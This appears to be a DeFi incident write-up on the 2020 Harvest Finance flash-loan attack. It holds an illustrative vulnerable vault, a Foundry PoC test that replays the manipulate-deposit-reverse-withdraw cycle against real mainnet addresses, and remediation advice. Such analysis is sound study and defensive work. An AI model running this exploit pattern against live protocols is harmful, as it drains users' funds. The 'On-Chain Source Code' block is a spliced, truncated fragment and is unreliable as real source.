# Harvest Finance — Flash Loan-Based AMM Price Manipulation Analysis

| Item | Details |
|------|------|
| **Date** | 2020-10-26 |
| **Protocol** | Harvest Finance |
| **Chain** | Ethereum Mainnet |
| **Loss** | ~$33,800,000 (USDC, USDT) |
| **Attacker** | [0xf224ab004461540778a914ea397c589b677e27bb](https://etherscan.io/address/0xf224ab004461540778a914ea397c589b677e27bb) |
| **Attack Tx** | [Multiple transactions](https://etherscan.io/tx/0x35f8d2f572fceaac9288e5d462117850ef2694786992a8c3f6d02612277b0877) |
| **Vulnerable Contract** | [0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE](https://etherscan.io/address/0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE) |
| **Root Cause** | The Harvest vault used the Curve Y pool's spot price (`get_virtual_price()`) directly during deposit/withdrawal without a manipulation-resistant oracle such as TWAP, enabling within-block price manipulation for deposit/withdrawal arbitrage |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2020-10/HarvestFinance_exp.sol) |

---
## 1. Vulnerability Overview

Harvest Finance is a yield aggregator that auto-compounds returns from Curve Finance's Y pool. When a user deposits USDC, Harvest supplies that USDC to the Curve Y pool and mints fUSDC tokens. The value of fUSDC is determined by the current USDC balance (spot price) in the Curve Y pool.

The attacker temporarily reduced the USDC balance in the Curve Y pool using a large flash loan, artificially lowering the USDC price. In this state, the attacker deposited USDC into Harvest to receive more fUSDC than warranted, then restored the price to normal and redeemed the fUSDC for more USDC than was originally deposited. This cycle was repeated to accumulate profit.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Harvest Finance USDC Vault (vulnerable price calculation)
contract HarvestUsdcVault {

    IcurveYSwap public curveYSwap;  // Curve Y pool interface

    // Calculate USDC-denominated value of fUSDC
    function getPricePerFullShare() public view returns (uint256) {
        // ❌ Directly uses Curve Y pool's current (spot) price
        // This value is manipulable via flash loans
        return curveYSwap.get_virtual_price();
    }

    // Deposit: USDC → mint fUSDC
    function deposit(uint256 amount) external {
        uint256 _pool = balance();  // ❌ Pool value calculated based on current price

        usdc.transferFrom(msg.sender, address(this), amount);

        // ❌ Manipulated low price → low _pool → more fUSDC minted
        uint256 shares = (amount * totalSupply()) / _pool;
        _mint(msg.sender, shares);
    }

    // Withdraw: burn fUSDC → return USDC
    function withdraw(uint256 shares) external {
        // ❌ Manipulated high price → high _pool → more USDC returned
        uint256 amount = (shares * balance()) / totalSupply();
        _burn(msg.sender, shares);
        usdc.transfer(msg.sender, amount);
    }
}

// ✅ Correct pattern: use TWAP or a manipulation-resistant price oracle
contract HarvestUsdcVaultFixed {
    function getPricePerFullShare() public view returns (uint256) {
        // ✅ Use time-weighted average price (not manipulable in the short term)
        return twapOracle.getPrice();
    }
}
```

---
### On-Chain Source Code

Source: Sourcify verified


**VaultProxy.sol** — Entry point:
```solidity
// ❌ Root cause: Harvest vault uses Curve Y pool's spot price (`get_virtual_price()`) directly during deposit/withdrawal without a manipulation-resistant oracle such as TWAP, enabling within-block
  function finalizeUpgrade() external;
}

// File: @openzeppelin/upgrades/contracts/upgradeability/Proxy.sol

pragma solidity ^0.5.0;

/**
 * @title Proxy
 * @dev Implements delegation of calls to other contracts, with proper
 * forwarding of return values and bubbling of failures.
 * It defines a fallback function that delegates all calls to the address
 * returned by the abstract _implementation() internal function.
 */
contract Proxy {
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Uniswap flash swap: borrow 50M USDC + 17.3M USDT
    │
    ├─[2] Manipulate Curve Y pool:
    │       exchange_underlying(USDT→USDC, 17.2M)
    │       → USDC in pool increases, USDT decreases → USDC price ↓
    │
    ├─[3] Deposit 49M USDC into Harvest (deposit)
    │       Based on manipulated low USDC price
    │       → Receive more fUSDC than normal
    │
    ├─[4] Reverse-manipulate Curve Y pool:
    │       exchange_underlying(USDC→USDT, 17.31M)
    │       → USDC price normalizes
    │
    ├─[5] Redeem all fUSDC (withdraw)
    │       Based on normal price → receive more USDC than deposited
    │
    ├─[6] Record profit, repeat [2]~[5] (6 times total)
    │
    └─[7] Repay flash loans + net profit of ~$33.8M secured
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";

contract ContractTest is Test {
    IUniswapV2Pair usdcPair = IUniswapV2Pair(0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc); // ETH/USDC
    IUniswapV2Pair usdtPair = IUniswapV2Pair(0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852); // ETH/USDT
    IcurveYSwap curveYSwap  = IcurveYSwap(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
    IHarvestUsdcVault harvest = IHarvestUsdcVault(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    IUSDT usdt = IUSDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    IERC20 usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 fusdc = IERC20(0xf0358e8c3CD5Fa238a29301d0bEa3D63A17bEdBE);

    uint256 usdcLoan = 50_000_000 * 10**6;      // 50M USDC flash loan
    uint256 usdcRepayment = (usdcLoan * 100_301) / 100_000; // including 0.301% fee
    uint256 usdtLoan = 17_300_000 * 10**6;      // 17.3M USDT flash loan
    uint256 usdtRepayment = (usdtLoan * 100_301) / 100_000;

    function testExploit() public {
        // Set token allowances
        usdt.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(curveYSwap), type(uint256).max);
        usdc.approve(address(harvest), type(uint256).max);

        // [Step 1] Borrow large USDC via Uniswap flash swap
        usdcPair.swap(usdcLoan, 0, address(this), "0x");
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        if (msg.sender == address(usdcPair)) {
            // After receiving USDC flash loan, borrow additional USDT
            usdtPair.swap(0, usdtLoan, address(this), "0x");
            // Repay flash loan
            usdc.transfer(address(usdcPair), usdcRepayment);
        }

        if (msg.sender == address(usdtPair)) {
            // [Steps 2~5] Repeat manipulate-deposit-reverse-withdraw cycle 6 times
            for (uint256 i = 0; i < 6; i++) {
                theSwap(i);
            }
            usdt.transfer(msg.sender, usdtRepayment);
        }
    }

    function theSwap(uint256 i) internal {
        // [Step 2] Swap USDT → USDC to suppress USDC price in Curve Y pool
        curveYSwap.exchange_underlying(2, 1, 17_200_000 * 10**6, 17_000_000 * 10**6);

        // [Step 3] Deposit into Harvest at the depressed USDC price → receive more fUSDC
        harvest.deposit(49_000_000_000_000);

        // [Step 4] Swap USDC → USDT to normalize Curve Y pool price
        curveYSwap.exchange_underlying(1, 2, 17_310_000 * 10**6, 17_000_000 * 10**6);

        // [Step 5] Redeem fUSDC at normal price → receive more USDC than deposited
        harvest.withdraw(fusdc.balanceOf(address(this)));
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Direct reliance on manipulable spot price (Unprotected Spot Price Oracle) |
| **Contributing Factor (attack amplifier)** | Flash loan (Uniswap V2) — merely a capital sourcing mechanism, not a vulnerability in itself |
| **Manipulation Target** | Curve Y pool spot price (`get_virtual_price()`) |
| **Vulnerable Mechanism** | Harvest vault uses the Curve Y pool's current price without validation during deposit/withdrawal |
| **Impact** | Gradual draining of the entire vault's liquidity |
| **Repeatability** | The same pattern can be repeated multiple times |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |

---
## 6. Remediation Recommendations

1. **Use a TWAP oracle**: Use a time-weighted average price instead of the current price to increase resistance against short-term manipulation.
2. **Price deviation limits**: Reject prices that deviate beyond a certain percentage from the recent average price.
3. **Block flash-loan deposit/withdrawal cycles**: Detect and block scenarios where a deposit and withdrawal occur consecutively within the same block.
4. **Minimum holding period**: Require a minimum number of blocks or elapsed time after deposit before withdrawal is permitted.

---
## 7. Lessons Learned

- **The root cause is unguarded reliance on spot price**: Flash loans are merely a means of sourcing capital. An attacker with sufficient real capital could have attacked Harvest the same way. The true flaw is that the vault used a manipulable AMM spot price without validation for deposit/withdrawal ratio calculations.
- **TWAP or manipulation-resistant oracles are essential**: Protocols like yield aggregators that use external AMM prices for internal accounting must use a time-weighted average price (TWAP) or an independent oracle such as Chainlink.
- **Compounded risk in yield aggregators**: Systems like Harvest that compose multiple DeFi protocols are exposed to the risk that price manipulation vulnerabilities in any component can cascade into their own core logic.
- **$33.8M lost in 7 minutes**: The attacker drained approximately $33.8M in roughly 7 minutes. Because price manipulation attacks can repeat the same pattern, monitoring that triggers an immediate halt upon detecting the first anomaly is essential.